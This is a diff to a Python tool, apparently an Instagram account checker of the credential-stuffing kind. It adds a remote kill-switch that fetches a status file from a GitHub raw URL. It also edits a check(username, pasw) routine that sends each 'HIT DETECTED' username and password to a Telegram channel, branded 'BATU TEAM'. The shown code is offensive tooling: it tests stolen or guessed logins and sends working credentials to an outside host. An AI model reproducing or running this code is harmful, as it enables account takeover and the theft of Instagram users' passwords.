@@ -1,3 +1,27 @@
+import sys
+import requests
+from colorama import Fore, init
+init(autoreset=True)
+
+def api_kontrol():
+    try:
+        url = "https://raw.githubusercontent.com/BatuTeam2831/lisanskontrol/main/durum1.txt"
+        response = requests.get(url, timeout=5)
+        if response.text.strip().upper() != "ACIK":
+            print(Fore.RED + "[×] APİ KAPANDI ALMAK İÇİN ~ :) @BatuX28")
+            sys.exit()
+    except:
+        print(Fore.RED + "[×] APİ HATASI")
+        sys.exit()
+
+api_kontrol()
+
+# Tool devamı burada başlar
+print(Fore.GREEN + "[✓] SÜRELİ APİ AKTİF TOOL AÇILIYOR...")
+
+
+
+
 import requests, os, random, time, sys, string, json, threading, webbrowser, base64
 from uuid import uuid4
 from concurrent.futures import ThreadPoolExecutor
@@ -74,8 +98,8 @@ def check(username, pasw):
             send_telegram(f"""
             🔥 𝙃𝙄𝙏 𝘿𝙀𝙏𝙀𝘾𝙏𝙀𝘿 🔥
 
-👤 𝙆𝙪𝙡𝙡𝙖𝙣ı𝙘ı 𝘼𝙙ı: `{username}`
-🔐 𝙎𝙞𝙛𝙧𝙚: `{pasw}`
+👤 𝙆𝙪𝙡𝙡𝙖𝙣ı𝙘ı 𝘼𝙙ı: {username}
+🔐 𝙎𝙞𝙛𝙧𝙚: {pasw}
 🔗 𝙋𝙧𝙤𝙛𝙞𝙡: instagram.com/{username}
 
 👑 𝗕𝗔𝗧𝗨 𝗧𝗘𝗔𝗠 • @BatuX28 | @BatuPython028
